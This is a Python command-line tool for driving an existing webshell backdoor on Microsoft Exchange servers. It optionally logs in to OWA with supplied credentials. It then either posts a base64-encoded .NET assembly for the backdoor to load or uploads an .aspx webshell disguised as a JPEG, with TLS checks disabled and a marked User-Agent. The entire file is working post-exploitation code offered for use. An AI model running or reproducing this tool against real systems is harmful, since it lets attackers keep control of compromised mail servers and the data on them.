#python3
import requests
import base64
import sys
import os
import urllib.parse
import urllib3
urllib3.disable_warnings()

def HttpPostData(url,path):
    print("[*] Try to read: " + path);
    with open(path, 'rb') as file_obj:
        content = file_obj.read()
    data = base64.b64encode(content).decode('utf8')
    print("[*] Try to access: " + url);
    body = {"demodata": data}
    postData = urllib.parse.urlencode(body).encode("utf-8")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx"
    } 
    response = requests.post(url, headers=headers, data=body, verify = False)
    return response.text

def HttpPostDataAuth(url,username,password,path):
    session = requests.session()
    temp=url.split("/")
    url1 = temp[0] + '//'+ temp[2] + '/owa/auth.owa'
    print(url1)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    } 
    payload = 'destination=https://%s/owa&flags=4&forcedownlevel=0&username=%s&password=%s&passwordText=&isUtf8=1'%(temp[2], username, password)            
    
    r = session.post(url1, headers=headers, data=payload, verify = False)
    print("[*] Try to login")
    if 'X-OWA-CANARY' in r.cookies:
        print("[+] Login success");       
    else:
        print("[!] Login error")
        exit(0)

    print("[*] Try to read: " + path);
    with open(path, 'rb') as file_obj:
        content = file_obj.read()
    data = base64.b64encode(content).decode('utf8')
    print("[*] Try to access: " + url);
    body = {"demodata": data}

    postData = urllib.parse.urlencode(body).encode("utf-8") 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx",
        "Content-Type":"application/x-www-form-urlencoded"
    } 

    response = session.post(url, headers=headers, data=body, verify = False)    
    session.close() 
    return response.text

def HttpUploadFile(url,path):
    print("[*] Try to read: " + path);
    with open(path, 'r') as file_obj:
        data = file_obj.read()    
    print("[*] Try to access: " + url);
    files = {'image_file':(path,data,'image/jpeg')};
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx"
    } 

    response = requests.post(url, headers=headers, files=files, verify = False)
    return response.text

def HttpUploadFileAuth(url,username,password,path):
    session = requests.session()
    temp=url.split("/")
    url1 = temp[0] + '//'+ temp[2] + '/owa/auth.owa'
    print(url1)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
    } 
    payload = 'destination=https://%s/owa&flags=4&forcedownlevel=0&username=%s&password=%s&passwordText=&isUtf8=1'%(temp[2], username, password)            
    
    r = session.post(url1, headers=headers, data=payload, verify = False)
    print("[*] Try to login")
    if 'X-OWA-CANARY' in r.cookies:
        print("[+] Login success");       
    else:
        print("[!] Login error")
        exit(0)

    print("[*] Try to read: " + path);
    with open(path, 'r') as file_obj:
        data = file_obj.read()

    print("[*] Try to access: " + url);
    files = {'image_file':(path,data,'image/jpeg')};
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx"
    } 

    response = session.post(url, headers=headers, files=files, verify = False)
    return response.text

if __name__ == "__main__":
    if len(sys.argv)!=6:
        note = '''
Use to send payload to the Exchange webshell backdoor.
Support:
    assemblyLoad
    webshellWrite

Usage:
    <url> <user> <password> <mode> <path>
mode:
    assemblyLoad
    webshellWrite
eg.
    {0} https://192.168.1.1/owa/auth/errorFE.aspx no auth assemblyLoad payload.dll
    {1} https://192.168.1.1/ecp/About.aspx user1 123456 webshellWrite payload.aspx
        '''
        print(note.format(sys.argv[0],sys.argv[0]))
        sys.exit(0)
    else:
        try:
            if sys.argv[4] == "assemblyLoad":
                print("[*] Mode: assemblyLoad");
                if((sys.argv[2] == "no") and (sys.argv[3] == "auth")):
                    print("[*] Auth: Null");    
                    result = HttpPostData(sys.argv[1], sys.argv[5]);
                    print("[*] Response: \n" + result);           
                else:
                    print("[*] Auth: "+ sys.argv[2] + " " + sys.argv[3]);    
                    result = HttpPostDataAuth(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[5]);
                    print("[*] Response: \n" + result);

            elif sys.argv[4] == "webshellWrite":
                print("[*] Mode: webshellWrite");
                if((sys.argv[2] == "no") and (sys.argv[3] == "auth")):
                    print("[*] Auth: Null");    
                    result = HttpUploadFile(sys.argv[1], sys.argv[5]);
                    print("[*] Response: \n" + result);
                else:
                    print("[*] Auth: "+ sys.argv[2] + " " + sys.argv[3]);    
                    result = HttpUploadFileAuth(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[5]);
                    print("[*] Response: \n" + result);

            else:
                print("[!] Wrong parameter");

        except Exception as e:
            print("[!] Error:%s"%(e))
            exit(0)



